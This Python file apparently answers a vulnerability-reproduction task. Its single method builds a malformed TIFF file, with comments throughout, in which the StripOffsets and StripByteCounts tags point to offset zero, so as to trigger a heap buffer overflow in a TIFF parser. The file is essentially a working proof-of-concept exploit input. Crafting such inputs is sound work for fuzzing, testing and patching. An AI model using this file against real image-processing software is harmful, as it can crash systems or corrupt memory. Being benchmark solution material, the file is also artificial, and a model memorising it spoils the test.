import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malicious TIFF file to trigger the Heap Buffer Overflow vulnerability.
        # The vulnerability is caused by invalid offline tags with a value offset of zero.
        # An "offline" tag is one where the data size exceeds 4 bytes.
        
        # TIFF Header: Little Endian ('II'), Version 42, Offset to first IFD 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entries
        # We construct an IFD with tags sorted by ID.
        # We define image properties that require an array for StripOffsets/StripByteCounts
        # to ensure they are "offline" (size > 4 bytes).
        # We set RowsPerStrip=1 and ImageLength=16, resulting in 16 strips.
        # StripOffsets/StripByteCounts will have Count=16, Type=LONG(4), Size=64 bytes.
        # We set the Value Offset to 0 to trigger the vulnerability.
        
        tags = []
        
        # Tag 256 (ImageWidth): Type LONG(4), Count 1, Value 16
        tags.append(struct.pack('<HHII', 256, 4, 1, 16))
        
        # Tag 257 (ImageLength): Type LONG(4), Count 1, Value 16
        tags.append(struct.pack('<HHII', 257, 4, 1, 16))
        
        # Tag 258 (BitsPerSample): Type SHORT(3), Count 1, Value 8
        tags.append(struct.pack('<HHII', 258, 3, 1, 8))
        
        # Tag 259 (Compression): Type SHORT(3), Count 1, Value 1 (None)
        tags.append(struct.pack('<HHII', 259, 3, 1, 1))
        
        # Tag 262 (PhotometricInterpretation): Type SHORT(3), Count 1, Value 1 (BlackIsZero)
        tags.append(struct.pack('<HHII', 262, 3, 1, 1))
        
        # Tag 273 (StripOffsets): Type LONG(4), Count 16, Offset 0 (TRIGGER)
        # Count 16 * 4 bytes = 64 bytes > 4, so it's offline. Offset 0 is invalid.
        tags.append(struct.pack('<HHII', 273, 4, 16, 0))
        
        # Tag 277 (SamplesPerPixel): Type SHORT(3), Count 1, Value 1
        tags.append(struct.pack('<HHII', 277, 3, 1, 1))
        
        # Tag 278 (RowsPerStrip): Type LONG(4), Count 1, Value 1
        tags.append(struct.pack('<HHII', 278, 4, 1, 1))
        
        # Tag 279 (StripByteCounts): Type LONG(4), Count 16, Offset 0 (TRIGGER)
        tags.append(struct.pack('<HHII', 279, 4, 16, 0))
        
        # IFD Construction
        # Number of directory entries (2 bytes)
        num_entries = len(tags)
        
        # Entries (12 bytes each)
        entries_data = b''.join(tags)
        
        # Offset to next IFD (4 bytes) - 0 means none
        next_ifd = 0
        
        ifd = struct.pack('<H', num_entries) + entries_data + struct.pack('<I', next_ifd)
        
        return header + ifd
